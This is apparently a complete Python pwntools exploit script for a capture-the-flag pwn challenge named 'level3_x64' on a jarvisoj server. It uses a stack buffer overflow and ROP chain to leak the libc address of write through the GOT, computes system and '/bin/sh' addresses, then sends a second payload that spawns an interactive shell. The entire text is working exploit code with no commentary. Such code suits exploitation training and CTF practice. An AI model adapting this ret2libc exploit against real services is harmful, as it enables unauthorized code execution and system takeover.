from pwn import * 
import sys

if len(sys.argv)<2:
	p = process('./level3_x64')
	elf = ELF('./level3_x64')
	libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
	p = remote('pwn2.jarvisoj.com',9883)
	elf = ELF('./level3_x64')
	libc = ELF('./libc-2.19.so')

write_plt = elf.plt['write']
write_got = elf.got['write']
main_addr = elf.symbols['main']
pop_rdi_ret = 0x00000000004006b3
pop_rsi_r15_ret = 0x00000000004006b1

gdb.attach(p)

payload1 = 'a'*0x80+'junkjunk'+p64(pop_rdi_ret)+p64(1)+p64(pop_rsi_r15_ret)+p64(write_got)+p64(0xdeadbeef)+p64(write_plt)+p64(main_addr)

p.sendlineafter('Input:\n',payload1)
write_addr = u64(p.recv(8))

libc.address = write_addr - libc.symbols['write']
log.success('libc_base:'+hex(libc.address))
system_addr = libc.symbols['system']
binsh = libc.search('/bin/sh').next()

pop_rdi_ret = 0x00000000004006b3

payload2 = 'a'*0x80+'junkjunk'+p64(pop_rdi_ret)+p64(binsh)+p64(system_addr)
p.sendlineafter('Input:',payload2)
p.interactive()
